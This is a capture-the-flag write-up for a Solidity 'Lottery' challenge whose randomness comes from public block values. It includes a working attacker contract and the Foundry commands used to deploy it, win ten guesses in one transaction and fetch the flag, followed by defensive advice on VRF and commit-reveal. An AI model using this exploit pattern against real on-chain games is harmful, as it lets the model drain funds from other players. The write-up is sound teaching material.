# Beltway Bandits — "Lottery" Writeup

**Category:** Blockchain / Smart Contract Security **Vulnerability class:** Weak / predictable on-chain randomness **Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`

---

## 1. Challenge Overview

We're given two Solidity files:

- `Setup.sol` — deploys a `Lottery` contract and exposes `isSolved()`, which returns `true` once someone wins the lottery.
- `Lottery.sol` — the actual gambling game. To win, a player must guess a "random" number correctly **10 times in a row**.

The challenge is solved the moment `Setup.isSolved()` returns `true`. Our job is to make that happen.

---

## 2. Reading the Source Code

### `Setup.sol`

```solidity
contract Setup {
    Lottery public lottery;

    constructor() {
        lottery = new Lottery();
    }

    function isSolved() external view returns (bool) {
        return lottery.winner() != address(0);
    }
}
```

Nothing tricky here — it just deploys a `Lottery` and checks whether `winner` has been set to a non-zero address.

### `Lottery.sol`

```solidity
contract Lottery {
    uint256 public constant STREAK_TO_WIN = 10;

    mapping(address => uint256) public streaks;
    address public winner;

    function random() public view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.difficulty
                )
            )
        );
    }

    function guess(uint256 _guess) external {
        uint256 target = random() % 100;
        bool correct = _guess == target;

        if (correct) {
            streaks[msg.sender] += 1;
            if (streaks[msg.sender] >= STREAK_TO_WIN) {
                winner = msg.sender;
            }
        } else {
            streaks[msg.sender] = 0;
        }
    }
}
```

The key function is `random()`. It claims to produce "a totally random number, sourced from the blockchain itself" — and that phrasing is the whole joke of the challenge. It's built from:

| Input | Is it secret? |
| --- | --- |
| `blockhash(block.number - 1)` | No — anyone can read the hash of the previous block |
| `block.timestamp` | No — the current block's timestamp, public |
| `block.difficulty` | No — public (on post-merge chains this returns `prevrandao`, still publicly readable) |

**None of these values are hidden from a smart contract.** Any contract executing in the same transaction can read exactly the same `block.number`, `block.timestamp`, and `block.difficulty`/`prevrandao` that `Lottery.random()` uses. That means an attacker doesn't have to *guess* the output of `random()` — they can simply **compute it themselves** by calling the exact same public `random()` function (or reimplementing the same formula) right before calling `guess()`.

Since `guess()` doesn't force you to wait for a new block between attempts, you can do this **10 times in a single transaction**, satisfying `STREAK_TO_WIN` instantly.

---

## 3. The Exploit

We write a small "attacker" contract that:

1. Takes the address of the deployed `Lottery` in its constructor.
2. In a loop of 10 iterations, calls `lottery.random()` to read the exact value the lottery will use, takes `% 100` of it (matching the lottery's own logic), and immediately calls `lottery.guess(target)` with that value.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Lottery} from "./Lottery.sol";

contract Exploit {
    Lottery public immutable lottery;

    constructor(address _lottery) {
        lottery = Lottery(_lottery);
    }

    function pwn() external {
        for (uint256 i = 0; i < 10; i++) {
            uint256 target = lottery.random() % 100;
            lottery.guess(target);
        }
    }
}
```

Because all 10 loop iterations happen inside **one transaction**, `block.number`, `block.timestamp`, and `block.difficulty` never change during the loop — so `random()` actually returns the *same* value every single call. That's fine for us: we just need `_guess == target`, and we're reading `target` directly from the contract immediately before submitting it, so it always matches.

Calling `pwn()` once is enough to win: after the 10th successful guess, `streaks[attacker] >= STREAK_TO_WIN`, so `Lottery` sets `winner = msg.sender` (the `Exploit` contract's address), and `Setup.isSolved()` becomes `true`.

---

## 4. Environment Setup (Foundry)

We used [Foundry](https://getfoundry.sh/) — specifically `forge` (compile/deploy) and `cast` (read/write calls) — to interact with the remote chain.

### 4.1 Install Foundry

```bash
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc      # or ~/.zshrc, depending on your shell
foundryup
```

If `foundryup` installs to a nonstandard location and your shell can't find `forge`/`cast` afterward, add it to your `PATH` manually, e.g. (Kali Linux example):

```bash
export PATH="$PATH:/home/kali/.config/.foundry/bin"
```

Then confirm the tools are available:

```bash
forge --version
cast --version
```

### 4.2 Create a project

```bash
forge init ctf --no-git
cd ctf
```

Place the provided `Lottery.sol` into `src/Lottery.sol`, and create `src/Exploit.sol` with the exploit contract shown above.

---

## 5. Getting a Challenge Instance

The challenge is served over a raw TCP socket (`ncat`), which issues you a **private, isolated blockchain instance** per team:

```
ncat 34.116.80.78 31338
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
ticket please: <YOUR_TEAM_NAME>      # case-sensitive!
```

This returns:

```
uuid:           <instance-uuid>
rpc endpoint:   http://<host>:<port>/<instance-uuid>
private key:    0x...                 (pre-funded test account)
setup contract: 0x...                 (address of the deployed Setup contract)
```

**Important:** the instance self-destructs after **30 minutes**, so work efficiently, and if it expires mid-exploit, just select `1` again for a fresh one (your source files/exploit code don't need to change — only the environment variables pointing at the new instance).

Export the values as shell variables for convenience:

```bash
export RPC=http://<host>:<port>/<instance-uuid>
export PK=0x<private-key>
export SETUP=0x<setup-contract-address>
```

---

## 6. Finding the Lottery Address

`Setup` stores a public reference to the `Lottery` it deployed. We can read it directly:

```bash
cast call $SETUP "lottery()(address)" --rpc-url $RPC
```

This returns the `Lottery` contract's address. Save it:

```bash
export LOTTERY=0x<address-from-above>
```

---

## 7. Deploying the Exploit Contract

```bash
forge create --rpc-url "$RPC" --private-key "$PK" --broadcast \
    src/Exploit.sol:Exploit --constructor-args "$LOTTERY"
```

### ⚠️ Gotcha we hit: argument ordering

`forge create`'s `--constructor-args` flag is **variadic** — it greedily consumes every token after it as a constructor argument. If you put `--broadcast` *after* `--constructor-args`, forge can mistake the literal string `--broadcast` for a *second* constructor argument, producing a confusing error:

```
Error: Constructor argument count mismatch: expected 1 but got 2
```

even though the contract genuinely only has one constructor parameter. **Fix:** always place `--constructor-args` (and the values that follow it) **last** in the command, after all other flags like `--broadcast`:

```bash
# ❌ Can break depending on forge version / flag parsing:
forge create ... --constructor-args "$LOTTERY" --broadcast

# ✅ Safe ordering:
forge create --rpc-url "$RPC" --private-key "$PK" --broadcast src/Exploit.sol:Exploit --constructor-args "$LOTTERY"
```

Other things worth checking if you ever hit the same "argument count mismatch" error:

- Run `echo -n "$VAR" | wc -c` to make sure a variable doesn't secretly contain trailing whitespace/newlines (a 40-hex-char address + `0x` should be exactly **42** characters).
- Run `forge clean && forge build` to rule out a stale cached artifact with an outdated ABI.
- Confirm you're running `forge` from your **project root** (where `foundry.toml` lives), not from inside `src/`.

Once deployed, save the new contract's address:

```bash
export EXPLOIT=0x<deployed-exploit-address>
```

---

## 8. Running the Exploit

Call `pwn()` on our deployed `Exploit` contract:

```bash
cast send --rpc-url "$RPC" --private-key "$PK" "$EXPLOIT" "pwn()"
```

This single transaction internally calls `guess()` on `Lottery` 10 times — each time reading the "random" target itself and using it to guess correctly.

---

## 9. Verifying the Win

```bash
cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC"
```

Output:

```
true
```

🎉 `Lottery.winner()` is now set to our `Exploit` contract's address, and the challenge considers itself solved.

---

## 10. Retrieving the Flag

Back in the `ncat` session:

```
ncat 34.116.80.78 31338
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
ticket please: <YOUR_TEAM_NAME>
```

Response:

```
CSS{U5E_4_R4ND0M_FUNCT10N}
```

Per the challenge's stated flag format (`CSSCTF{CSS{...}}`), the final submitted flag is:

```
CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```

---

## 11. Root Cause & Takeaway

The flag itself spells out the lesson: **"USE A RANDOM FUNCTION."**

`block.timestamp`, `blockhash`, and `block.difficulty`/`prevrandao` are **not sources of secret randomness** — they're all publicly readable by any contract or observer before or during the same transaction. Any on-chain "lottery," "raffle," or guessing game that derives its randomness purely from these values can be defeated by a contract that reads the same inputs and computes the same output.

### How real contracts solve this

- **Chainlink VRF** (Verifiable Random Function) — provides cryptographically verifiable randomness generated off-chain and proven on-chain.
- **Commit-reveal schemes** — users commit to a hashed guess before randomness is revealed, preventing them from reacting to it.
- **Randomness beacons** (e.g., drand, or protocol-level beacon chain randomness used carefully, with appropriate delay/commitment to prevent same-block manipulation).

The core defensive principle: **never treat values computable inside a transaction (by any contract) as unpredictable.** If an attacker can read it, they can react to it.